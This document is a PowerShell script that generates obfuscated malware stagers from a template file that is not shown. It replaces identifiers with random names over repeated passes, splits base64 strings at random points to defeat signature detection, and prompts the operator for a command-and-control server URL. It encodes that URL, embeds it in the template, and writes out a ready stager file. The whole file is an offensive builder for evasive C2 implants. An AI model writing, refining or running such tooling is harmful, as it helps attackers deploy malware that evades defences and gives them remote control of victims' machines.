function Get-RandomName {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    -join (1..(Get-Random -Minimum 2 -Maximum 6) | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
}

function Encode-Base64($str) {
    [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($str))
}

function Split-Base64String($b64) {
    if ($b64.Length -le 10) { return "`"$b64`"" }
    $splitAt = Get-Random -Minimum 5 -Maximum ($b64.Length - 5)
    $part1 = $b64.Substring(0, $splitAt)
    $part2 = $b64.Substring($splitAt)
    return "(`"$part1`" + `"$part2`")"
}

# Read template
$templatePath = ".\v6template(compressed).ps1"
$template = Get-Content $templatePath -Raw

$passes = 3
for ($i = 0; $i -lt $passes; $i++) {
    # Generate new random names for each pass
    $names = @{
        g9q = Get-RandomName
        z1r = Get-RandomName
        x2y = Get-RandomName
        y7t = Get-RandomName
        r4d = Get-RandomName
        h1  = Get-RandomName
        #d1  = Get-RandomName
        uA  = Get-RandomName
        hD  = Get-RandomName
        regB = Get-RandomName
        A1  = Get-RandomName
        p1  = Get-RandomName
        b2  = Get-RandomName
        r2  = Get-RandomName
        cM  = Get-RandomName
        rS  = Get-RandomName
        rB  = Get-RandomName
    }

    foreach ($k in $names.Keys) {
        if ($k -eq 'd1') { continue }
        $template = $template -replace "\b$k\b", $names[$k]
    }
}

# Replace variable/function names in template
foreach ($k in $names.Keys) {
    # Skip device_id/d1 so it stays as device_id in the output
    if ($k -eq 'd1') { continue }
    $template = $template -replace "\b$k\b", $names[$k]
}

# Fix: Ensure User-Agent is always a function call
$userAgentPattern = '(("User-Agent"\s*=\s*)(\w+))(\s*[,}])'
$template = [regex]::Replace(
    $template,
    $userAgentPattern,
    { param($m) "$($m.Groups[2].Value)$($m.Groups[3].Value)()$($m.Groups[4].Value)" }
)

$pattern = "$($names.g9q)\s*""([A-Za-z0-9\+/=]+)"""
$matches1 = [regex]::Matches($template, $pattern)
foreach ($match in $matches1) {
    $full = $match.Value
    $b64 = $match.Groups[1].Value
    $split = Split-Base64String $b64
    $replacement = "$($names.g9q) $split"
    $template = $template -replace [regex]::Escape($full), $replacement
}

# Prompt for new C2 URL and replace the C2 URL assignment
$newC2 = Read-Host "Enter C2 URL (e.g. https://yourc2.com:443)"
$newC2b64 = Encode-Base64 $newC2


$c2Pattern = "(\$\w+\s*=\s*$($names.g9q)\s*)""[^""]+"""
$c2Match = [regex]::Match($template, $c2Pattern)
if ($c2Match.Success) {
    $before = $c2Match.Groups[1].Value
    $template = $template -replace [regex]::Escape($c2Match.Value), "$before`"$newC2b64`""
}

# Output to file
$outPath = ".\v6stager_gen.ps1"
Set-Content -Path $outPath -Value $template

Write-Host "Generated stager saved to $outPath"